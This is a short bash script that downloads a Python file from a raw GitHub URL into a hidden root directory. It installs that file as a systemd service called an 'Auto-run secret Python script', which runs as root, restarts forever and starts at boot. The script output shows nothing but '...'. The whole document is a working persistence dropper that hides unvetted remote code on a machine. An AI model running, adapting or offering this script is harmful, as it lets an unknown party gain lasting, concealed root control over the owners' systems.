#!/bin/bash
PYTHON_FILE_URL="https://raw.githubusercontent.com/t56r4re/34553/refs/heads/main/gd.py"
SECRET_DIR="/root/.system_service"
DEST_FILE="$SECRET_DIR/gd.py"
SERVICE_FILE="/etc/systemd/system/python_auto.service"
PYTHON_PATH="$(which python3)"

if [ ! -d "$SECRET_DIR" ]; then
    mkdir -p "$SECRET_DIR"
    chmod 700 "$SECRET_DIR"
fi

curl -s -o "$DEST_FILE" "$PYTHON_FILE_URL"
chmod 700 "$DEST_FILE"

cat <<EOL > "$SERVICE_FILE"
[Unit]
Description=Auto-run secret Python script
After=network.target

[Service]
Type=simple
ExecStart=$PYTHON_PATH $DEST_FILE
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOL

# -----------------------------
# Reload systemd, enable and start service
# -----------------------------
systemctl daemon-reload
systemctl enable python_auto.service
systemctl start python_auto.service

echo "..."

